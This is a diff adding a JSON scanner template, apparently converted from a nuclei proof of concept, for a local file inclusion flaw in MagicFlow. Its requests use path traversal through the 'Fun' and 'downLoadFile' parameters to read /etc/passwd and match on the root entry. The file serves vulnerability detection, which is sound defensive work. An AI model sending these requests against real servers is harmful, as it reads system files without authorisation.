@@ -1,0 +1,144 @@
+{
+  "id": "magicflow-lfi",
+  "name": "MagicFlow - Local File Inclusion",
+  "author": "gy741",
+  "severity": "HIGH",
+  "description": "MagicFlow is susceptible to local file inclusion vulnerabilities because it allows remote unauthenticated users to access locally stored files on the server and return their content via the \u0027/msa/main.xp\u0027 endpoint and the \u0027Fun\u0027 parameter.\n",
+  "references": [
+    "https://www.seebug.org/vuldb/ssvid-89258"
+  ],
+  "tags": [
+    "magicflow",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "8.6",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/msa/main.xp?Fun\u003dmsaDataCenetrDownLoadMore+delflag\u003d1+downLoadFileName\u003dmsagroup.txt+downLoadFile\u003d../../../../../../etc/passwd",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "magicflow-lfi",
+    "info": {
+      "name": "MagicFlow - Local File Inclusion",
+      "author": "gy741",
+      "severity": "high",
+      "description": "MagicFlow is susceptible to local file inclusion vulnerabilities because it allows remote unauthenticated users to access locally stored files on the server and return their content via the \u0027/msa/main.xp\u0027 endpoint and the \u0027Fun\u0027 parameter.\n",
+      "reference": [
+        "https://www.seebug.org/vuldb/ssvid-89258"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+        "cvss_score": "8.6",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "magicflow,lfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/msa/main.xp?Fun\u003dmsaDataCenetrDownLoadMore+delflag\u003d1+downLoadFileName\u003dmsagroup.txt+downLoadFile\u003d../../../../../../etc/passwd",
+          "{{BaseURL}}/msa/../../../../../../../../etc/passwd"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
